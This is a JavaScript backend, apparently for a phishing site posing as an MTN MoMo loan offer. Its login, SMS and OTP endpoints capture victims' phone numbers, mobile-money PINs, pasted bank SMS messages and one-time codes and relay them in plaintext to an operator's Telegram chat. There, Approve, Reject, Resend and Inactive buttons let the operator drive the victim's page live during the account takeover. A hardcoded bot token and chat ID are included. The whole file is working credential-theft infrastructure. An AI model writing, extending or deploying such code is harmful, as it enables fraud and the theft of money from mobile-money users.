/* ============================================================
   MTN MoMo Loan — Backend (momo-advance-loan)
   - Live approve/reject via Telegram inline buttons
   - Per-page buttons:
       * login: [✅ Approve] [❌ Reject]
       * sms:   [✅ Approve] [❌ Reject] [🔁 Resend]
       * otp:   [✅ Approve] [❌ Reject] [🔁 Resend] [⚠️ Inactive]
   - Statuses returned to frontend:
       approve  → 'approved'
       reject   → 'rejected'
       resend   → 'resend'
       inactive → 'inactive'
   - Sessions persisted to disk (survive Railway restarts)
   - SMS body wrapped in <pre><code> for Telegram copy button
   ============================================================ */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const fs = require('fs');

const app = express();

/* ============================================================
   CONFIG
   ============================================================ */
const PORT = process.env.PORT || 5000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8853284102:AAGY6LaDIXbT_tSnlEwnwBIixESaP_Tf8Xk';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '6609017701';

const TELEGRAM_API         = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_ANSWER_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
const TELEGRAM_EDIT_URL    = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
const TELEGRAM_WEBHOOK_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;

const SESSION_TIMEOUT_MS = 60 * 60 * 1000;   // 60 min → pending becomes timeout
const SESSION_MAX_AGE_MS = 120 * 60 * 1000;  // 120 min → hard delete

/* ============================================================
   PERSISTENT SESSION STORE
   ============================================================ */
const SESSIONS_FILE = '/tmp/sessions.json';

let sessions = new Map();
try {
  if (fs.existsSync(SESSIONS_FILE)) {
    const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
    sessions = new Map(JSON.parse(raw));
    console.log(`✅ Restored ${sessions.size} sessions from disk`);
  }
} catch (e) {
  console.warn('Could not restore sessions:', e.message);
}

function persistSessions() {
  try {
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify([...sessions.entries()]));
  } catch (e) {
    console.warn('persist failed:', e.message);
  }
}

setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [id, s] of sessions.entries()) {
    const age = now - s.createdAt;
    if (s.status === 'pending' && age > SESSION_TIMEOUT_MS) {
      s.status = 'timeout';
      s.resolvedAt = now;
      changed = true;
    }
    if (age > SESSION_MAX_AGE_MS) {
      sessions.delete(id);
      changed = true;
    }
  }
  if (changed) persistSessions();
}, 60 * 1000);

/* ============================================================
   MIDDLEWARE
   ============================================================ */
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

/* ============================================================
   HELPERS
   ============================================================ */
function makeSessionId() { return crypto.randomBytes(16).toString('hex'); }

function makeReference(prefix = 'REF') {
  const stamp = Date.now().toString(36).toUpperCase();
  const rand  = crypto.randomBytes(3).toString('hex').toUpperCase();
  return `${prefix}-${stamp}-${rand}`;
}

function makeToken() { return crypto.randomBytes(24).toString('hex'); }

function escapeHtml(s = '') {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function isValidPhone(phone) {
  return typeof phone === 'string' && /^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''));
}

/* ============================================================
   TELEGRAM — keyboards per step
   ============================================================ */
function buildKeyboard(step, sessionId) {
  if (step === 'login') {
    return { inline_keyboard: [[
      { text: '✅ Approve', callback_data: `approve:login:${sessionId}` },
      { text: '❌ Reject',  callback_data: `reject:login:${sessionId}` }
    ]]};
  }
  if (step === 'sms') {
    return { inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `approve:sms:${sessionId}` },
        { text: '❌ Reject',  callback_data: `reject:sms:${sessionId}` }
      ],
      [
        { text: '🔁 Resend',  callback_data: `resend:sms:${sessionId}` }
      ]
    ]};
  }
  if (step === 'otp') {
    return { inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `approve:otp:${sessionId}` },
        { text: '❌ Reject',  callback_data: `reject:otp:${sessionId}` }
      ],
      [
        { text: '🔁 Resend',  callback_data: `resend:otp:${sessionId}` },
        { text: '⚠️ Inactive', callback_data: `inactive:otp:${sessionId}` }
      ]
    ]};
  }
  return { inline_keyboard: [[
    { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
    { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
  ]]};
}

/* ============================================================
   TELEGRAM — send / edit / answer
   ============================================================ */
async function sendTelegramWithButtons(text, sessionId, step) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram env vars missing — message not sent.');
    return { ok: false, messageId: null, error: 'telegram_not_configured' };
  }
  try {
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: buildKeyboard(step, sessionId)
    };
    const res = await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await res.json().catch(() => ({}));
    if (!data.ok) {
      console.warn(`⚠️ Telegram send rejected [${step}]:`, data.description || data);
      return { ok: false, messageId: null, error: data.description || 'telegram_rejected' };
    }
    return { ok: true, messageId: data.result.message_id || null, error: null };
  } catch (err) {
    console.error('❌ Telegram fetch failed:', err.message);
    return { ok: false, messageId: null, error: err.message };
  }
}

async function editTelegramMessage(messageId, text, replyMarkup) {
  if (!messageId || !TELEGRAM_BOT_TOKEN) return;
  try {
    const body = {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    };
    if (replyMarkup !== undefined) body.reply_markup = replyMarkup;
    await fetch(TELEGRAM_EDIT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (err) { console.error('editTelegramMessage failed:', err.message); }
}

async function answerCallback(callbackQueryId, text) {
  if (!callbackQueryId || !TELEGRAM_BOT_TOKEN) return;
  try {
    await fetch(TELEGRAM_ANSWER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false })
    });
  } catch (err) { console.error('answerCallback failed:', err.message); }
}

async function handleExpiredSession(cb, sessionId) {
  await answerCallback(cb.id, '⌛ This request has expired');
  try {
    const messageId = cb.message?.message_id;
    if (messageId) {
      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
      const expiredText =
        `⌛ <b>EXPIRED — NO ACTION NEEDED</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `This request is too old to process.\n` +
        `Session: <code>${escapeHtml(sessionId || 'unknown')}</code>\n\n` +
        `🕒 <b>Marked at:</b> ${when}`;
      await editTelegramMessage(messageId, expiredText, { inline_keyboard: [] });
      console.log(`[expired] message ${messageId} marked as EXPIRED`);
    }
  } catch (err) { console.error('expired edit failed:', err.message); }
}

/* ============================================================
   HEALTH CHECK
   ============================================================ */
app.get('/', (_req, res) => {
  res.json({
    ok: true,
    service: 'momo-advance-loan-backend',
    activeSessions: sessions.size,
    webhook: global.__webhookStatus || 'unknown',
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    sessionTTLMinutes: SESSION_TIMEOUT_MS / 60000,
    time: new Date().toISOString()
  });
});

/* ============================================================
   POST /api/login
   ============================================================ */
app.post('/api/login', async (req, res) => {
  try {
    const { phone = '', pin = '', country = 'CM' } = req.body || {};

    console.log('📥 /api/login:', { phone, country, pinLength: pin.length });

    if (!isValidPhone(phone)) {
      console.warn('❌ /api/login invalid phone:', phone);
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof pin !== 'string' || pin.length < 4) {
      console.warn('❌ /api/login invalid pin length:', pin.length);
      return res.status(400).json({ ok: false, error: 'Invalid PIN' });
    }

    const sessionId = makeSessionId();
    const token = makeToken();

    const text =
      `🔐 <b>MoMo Login — Awaiting Approval</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🌍 <b>Country:</b> ${escapeHtml(country)}\n` +
      `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n` +
      `🌐 <b>IP:</b> <code>${escapeHtml(req.ip || 'unknown')}</code>\n\n` +
      `⏳ Tap ✅ or ❌ below`;

    const result = await sendTelegramWithButtons(text, sessionId, 'login');
    console.log(`[login] sid=${sessionId} tgOk=${result.ok} msgId=${result.messageId} err=${result.error}`);

    sessions.set(sessionId, {
      step: 'login',
      status: 'pending',
      data: { phone, country, token },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: result.messageId,
      telegramError: result.error
    });
    persistSessions();

    return res.json({ ok: true, requestId: sessionId, sessionId, token });
  } catch (err) {
    console.error('login error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/sms
   ============================================================ */
app.post('/api/sms', async (req, res) => {
  try {
    const { phone = '', token = '', sms = '' } = req.body || {};

    console.log('📥 /api/sms:', { phone, token: token ? token.slice(0, 8) + '…' : '(empty)', smsLength: typeof sms === 'string' ? sms.length : 'not-string' });

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof sms !== 'string' || sms.trim().length < 5) {
      return res.status(400).json({ ok: false, error: 'SMS text required' });
    }

    const sessionId = makeSessionId();
    const reference = makeReference('SMS');

    const text =
      `📩 <b>Pasted SMS — Awaiting Approval</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n\n` +
      `📝 <b>Message:</b>\n<pre><code>${escapeHtml(sms)}</code></pre>\n` +
      `⏳ Tap ✅ / ❌ / 🔁 below`;

    const result = await sendTelegramWithButtons(text, sessionId, 'sms');
    console.log(`[sms] sid=${sessionId} tgOk=${result.ok} msgId=${result.messageId} err=${result.error}`);

    sessions.set(sessionId, {
      step: 'sms',
      status: 'pending',
      data: { phone, token, sms, reference },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: result.messageId,
      telegramError: result.error
    });
    persistSessions();

    return res.json({ ok: true, requestId: sessionId, sessionId, reference, telegramOk: result.ok });
  } catch (err) {
    console.error('sms error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/verify-otp
   ============================================================ */
app.post('/api/verify-otp', async (req, res) => {
  try {
    const { phone = '', otp = '', sms = '' } = req.body || {};

    console.log('📥 /api/verify-otp:', { phone, otpLength: otp.length, smsLength: sms.length });

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof otp !== 'string' || !/^\d{4,8}$/.test(otp)) {
      return res.status(400).json({ ok: false, error: 'Invalid OTP' });
    }

    const sessionId = makeSessionId();
    const reference = makeReference('OTP');

    const text =
      `🔢 <b>OTP Entered — Awaiting Approval</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🔢 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
      `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}` +
      (sms ? `\n\n📝 <b>Linked SMS:</b>\n<pre><code>${escapeHtml(sms.slice(0, 400))}</code></pre>` : '') +
      `\n⏳ Tap ✅ / ❌ / 🔁 / ⚠️ below`;

    const result = await sendTelegramWithButtons(text, sessionId, 'otp');
    console.log(`[otp] sid=${sessionId} tgOk=${result.ok} msgId=${result.messageId} err=${result.error}`);

    sessions.set(sessionId, {
      step: 'otp',
      status: 'pending',
      data: { phone, otp, sms, reference },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: result.messageId,
      telegramError: result.error
    });
    persistSessions();

    return res.json({ ok: true, requestId: sessionId, sessionId, reference, telegramOk: result.ok });
  } catch (err) {
    console.error('verify-otp error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/resend-sms
   ============================================================ */
app.post('/api/resend-sms', async (req, res) => {
  try {
    const { phone = '' } = req.body || {};
    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    const text =
      `🔁 <b>User requested SMS resend</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}`;
    await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID, text,
        parse_mode: 'HTML', disable_web_page_preview: true
      })
    });
    return res.json({ ok: true });
  } catch (err) {
    console.error('resend-sms error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   GET /api/approval/status/:requestId  (canonical)
   GET /api/status/:sessionId           (backwards-compat alias)
   ============================================================ */
function statusHandler(req, res) {
  const key = req.params.requestId || req.params.sessionId;
  const session = sessions.get(key);
  if (!session) return res.json({ ok: true, status: 'unknown', step: null });

  if (session.status === 'pending'
      && Date.now() - session.createdAt > SESSION_TIMEOUT_MS) {
    session.status = 'timeout';
    session.resolvedAt = Date.now();
    persistSessions();
  }

  return res.json({
    ok: true,
    status: session.status,
    step: session.step,
    telegramOk: !!session.telegramMessageId,
    telegramError: session.telegramError || null
  });
}

app.get('/api/approval/status/:requestId', statusHandler);
app.get('/api/status/:sessionId', statusHandler);

/* ============================================================
   POST /api/telegram-webhook
   ============================================================ */
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cb = update.callback_query;
    if (!cb || !cb.data) return res.json({ ok: true });

    const [action, step, sessionId] = String(cb.data).split(':');
    const session = sessions.get(sessionId);

    console.log(`[webhook] action=${action} step=${step} sid=${sessionId} found=${!!session}`);

    if (!session) {
      await handleExpiredSession(cb, sessionId);
      return res.json({ ok: true });
    }

    if (['approved','rejected','timeout','inactive'].includes(session.status)) {
      await answerCallback(cb.id, `Already ${session.status}`);
      return res.json({ ok: true });
    }

    /* 🔁 RESEND */
    if (action === 'resend') {
      session.status = 'resend';
      session.resolvedAt = Date.now();
      persistSessions();
      await answerCallback(cb.id, '🔁 Resend requested');
      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
      const newText =
        `🔁 <b>RESEND REQUESTED</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        stripFirstLine(session.originalText) +
        `\n\n🕒 <b>Requested:</b> ${when}`;
      if (session.telegramMessageId) {
        await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
      }
      return res.json({ ok: true });
    }

    /* ⚠️ INACTIVE — special */
    if (action === 'inactive') {
      session.status = 'inactive';
      session.resolvedAt = Date.now();
      persistSessions();
      await answerCallback(cb.id, '⚠️ Marked as inactive');
      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
      const newText =
        `⚠️ <b>ACCOUNT INACTIVE</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        stripFirstLine(session.originalText) +
        `\n\n🕒 <b>Marked at:</b> ${when}`;
      if (session.telegramMessageId) {
        await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
      }
      return res.json({ ok: true });
    }

    /* ✅ APPROVE / ❌ REJECT */
    let statusLine, answerText;
    if (action === 'approve') {
      session.status = 'approved';
      session.resolvedAt = Date.now();
      persistSessions();
      statusLine = '✅ <b>APPROVED</b>';
      answerText = '✅ Approved';
    } else if (action === 'reject') {
      session.status = 'rejected';
      session.resolvedAt = Date.now();
      persistSessions();
      statusLine = '❌ <b>REJECTED</b>';
      answerText = '❌ Rejected';
    } else {
      await answerCallback(cb.id, 'Unknown action');
      return res.json({ ok: true });
    }

    await answerCallback(cb.id, answerText);
    const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
    const newText =
      `${statusLine}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      stripFirstLine(session.originalText) +
      `\n\n🕒 <b>Resolved:</b> ${when}`;

    if (session.telegramMessageId) {
      await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error('webhook error:', err);
    return res.json({ ok: true });
  }
});

/* ============================================================
   UTIL: strip first line + divider
   ============================================================ */
function stripFirstLine(text) {
  if (!text) return '';
  const idx = text.indexOf('\n');
  if (idx === -1) return '';
  const rest = text.slice(idx + 1);
  return rest.replace(/^━+\n/, '').trim();
}

/* ============================================================
   404 + ERROR HANDLERS
   ============================================================ */
app.use((_req, res) => res.status(404).json({ ok: false, error: 'Not found' }));
app.use((err, _req, res, _next) => {
  console.error('unhandled error:', err);
  res.status(500).json({ ok: false, error: 'Server error' });
});

/* ============================================================
   AUTO-REGISTER TELEGRAM WEBHOOK
   ============================================================ */
async function registerWebhook() {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('⚠️ Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
    global.__webhookStatus = 'missing_token';
    return;
  }

  let publicUrl = process.env.PUBLIC_URL || '';
  if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
    publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
  }
  publicUrl = publicUrl.replace(/\/+$/, '');

  if (!publicUrl) {
    console.warn('⚠️ No PUBLIC_URL / RAILWAY_PUBLIC_DOMAIN set');
    global.__webhookStatus = 'missing_url';
    return;
  }

  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log('🔗 Registering webhook:', webhookUrl);

  try {
    const res = await fetch(TELEGRAM_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: webhookUrl, allowed_updates: ['callback_query'] })
    });
    const data = await res.json().catch(() => ({}));
    if (data.ok) {
      console.log('✅ Telegram webhook registered:', webhookUrl);
      global.__webhookStatus = 'ok';
    } else {
      console.warn('⚠️ Webhook registration failed:', data.description || data);
      global.__webhookStatus = `failed: ${data.description || 'unknown'}`;
    }
  } catch (err) {
    console.error('❌ Webhook registration error:', err.message);
    global.__webhookStatus = `error: ${err.message}`;
  }
}

/* ============================================================
   START
   ============================================================ */
app.listen(PORT, async () => {
  console.log('====================================');
  console.log('💰 MTN MoMo Loan — backend running');
  console.log(`🚀 Port: ${PORT}`);
  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
  console.log(`🤖 Bot token: ${TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.slice(0, 15) + '…' : 'MISSING'}`);
  console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID || 'MISSING'}`);
  console.log(`⏱️  Session TTL: ${SESSION_TIMEOUT_MS / 60000} min`);
  console.log(`🗑️  Max age:     ${SESSION_MAX_AGE_MS / 60000} min`);
  console.log('====================================');
  setTimeout(registerWebhook, 2000);
});
